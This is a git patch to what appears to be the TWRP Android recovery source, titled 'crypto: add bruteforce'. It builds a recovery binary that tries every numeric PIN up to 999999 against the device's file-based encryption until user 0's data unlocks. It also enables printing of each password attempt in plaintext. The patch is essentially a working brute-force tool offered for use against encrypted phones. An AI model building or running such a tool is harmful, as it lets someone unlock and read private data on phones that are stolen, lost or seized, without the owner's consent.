@@ -1,0 +1,135 @@
+From 2615bed86b2d2d9b80af2a1b9080dd346139ea18 Mon Sep 17 00:00:00 2001
+From: Raphael Mounier <mounierr07@gmail.com>
+Date: Mon, 23 Nov 2026 13:39:54 +0100
+Subject: [PATCH] crypto: add bruteforce
+
+---
+ crypto/fscrypt/Android.mk        | 10 ++++++
+ crypto/fscrypt/Decrypt.cpp       |  8 ++++-
+ crypto/fscrypt/main-brutefbe.cpp | 60 ++++++++++++++++++++++++++++++++
+ 3 files changed, 77 insertions(+), 1 deletion(-)
+ create mode 100644 crypto/fscrypt/main-brutefbe.cpp
+
+diff --git a/crypto/fscrypt/Android.mk b/crypto/fscrypt/Android.mk
+index d9fb6ef5..ba06ce50 100755
+--- a/crypto/fscrypt/Android.mk
++++ b/crypto/fscrypt/Android.mk
+@@ -72,6 +72,16 @@ LOCAL_SHARED_LIBRARIES := libtwrpfscrypt
+ 
+ include $(BUILD_EXECUTABLE)
+ 
++include $(CLEAR_VARS)
++LOCAL_MODULE := brutefbe
++LOCAL_MODULE_TAGS := optional
++LOCAL_MODULE_CLASS := RECOVERY_EXECUTABLES
++LOCAL_MODULE_PATH := $(TARGET_RECOVERY_ROOT_OUT)/system/bin
++LOCAL_SRC_FILES := main-brutefbe.cpp
++LOCAL_SHARED_LIBRARIES := libtwrpfscrypt
++
++include $(BUILD_EXECUTABLE)
++
+ include $(CLEAR_VARS)
+ LOCAL_MODULE := keystore_auth
+ LOCAL_MODULE_TAGS := optional
+diff --git a/crypto/fscrypt/Decrypt.cpp b/crypto/fscrypt/Decrypt.cpp
+index 02173588..4c91631e 100755
+--- a/crypto/fscrypt/Decrypt.cpp
++++ b/crypto/fscrypt/Decrypt.cpp
+@@ -907,7 +907,8 @@ bool Decrypt_User_Synth_Pass(const userid_t user_id, const std::string& Password
+ 	}
+ 	// printf("pwd N %i R %i P %i salt ", pwd.scryptN, pwd.scryptR, pwd.scryptP); output_hex((char*)pwd.salt, pwd.salt_len); printf("\n");
+ 	unsigned char password_token[PASSWORD_TOKEN_SIZE];
+-	// printf("Password: '%s'\n", Password.c_str());
++	printf("Password: '%s'\n", Password.c_str());
++	
+ 	// The password token is the password scrypted with the parameters from the password data file
+ 	if (!Get_Password_Token(&pwd, Password, &password_token[0])) {
+ 		printf("Failed to Get_Password_Token\n");
+@@ -1047,6 +1048,9 @@ bool Decrypt_User_Synth_Pass(const userid_t user_id, const std::string& Password
+ 		printf("failed to unwrapSyntheticPasswordBlob\n");
+ 		return Free_Return(retval, weaver_key, &pwd);
+ 	}
++	
++	printf("User %i pass ok!\n", user_id);
++	
+ 
+ 	if (!fscrypt_unlock_user_key(user_id, 0, token.c_str(), secret.c_str())) {
+ 		printf("fscrypt_unlock_user_key returned fail\n");
+@@ -1198,6 +1202,8 @@ bool Decrypt_User(const userid_t user_id, const std::string& Password) {
+ 		return false;
+ 	}
+ 
++        printf("password ok !!\n");
++
+ 	char token_hex[(auth_token_len*2)+1];
+ 	token_hex[(auth_token_len*2)] = 0;
+ 	uint32_t i;
+diff --git a/crypto/fscrypt/main-brutefbe.cpp b/crypto/fscrypt/main-brutefbe.cpp
+new file mode 100644
+index 00000000..f832b994
+--- /dev/null
++++ b/crypto/fscrypt/main-brutefbe.cpp
+@@ -0,0 +1,60 @@
++/*
++ * Copyright (C) 2016 Team Win Recovery Project
++ *
++ * Licensed under the Apache License, Version 2.0 (the "License");
++ * you may not use this file except in compliance with the License.
++ * You may obtain a copy of the License at
++ *
++ *      http://www.apache.org/licenses/LICENSE-2.0
++ *
++ * Unless required by applicable law or agreed to in writing, software
++ * distributed under the License is distributed on an "AS IS" BASIS,
++ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++ * See the License for the specific language governing permissions and
++ * limitations under the License.
++ */
++
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include "Decrypt.h"
++
++int main(int argc, char *argv[]) {
++ bool ret = false;
++ char snum[12];
++ 
++
++
++   // To test pass the password in argv
++   if (argc < 2) {
++      printf("Start brute force decrypt with 6 digits\n");
++      // Max 6 digits for pass
++      for (int num=0;num<1000000;num++)
++      {
++         sprintf( snum, "%04d", num );
++
++         // Print our string
++         printf("Try password : %s\n", snum);
++         ret = Decrypt_User(0, snum);
++
++         if (ret) {
++            break;
++         }
++      }
++   }
++   else if (argc < 3) {
++      printf("Decrypt with %s code\n",argv[1]);
++      ret = Decrypt_User(0, argv[1]);
++   }
++      
++   if (!ret) {
++      printf("Failed to decrypt\n");
++      return -1;
++   }
++   else {
++      printf("Password Found\n");
++      return 0;
++   }
++   
++   return 0;
++}
+-- 
+2.25.1
+
